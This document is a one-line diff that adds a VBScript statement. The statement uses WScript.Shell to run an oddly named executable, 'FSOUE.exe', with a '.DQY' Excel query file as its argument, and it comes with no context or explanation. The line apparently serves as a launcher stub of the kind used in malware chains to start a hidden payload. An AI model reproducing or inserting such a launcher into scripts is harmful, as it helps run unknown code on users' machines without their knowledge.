@@ -1,0 +1,1 @@
+CreateObject("WScript.Shell").Run"FSOUE.exe 695303.DQY"
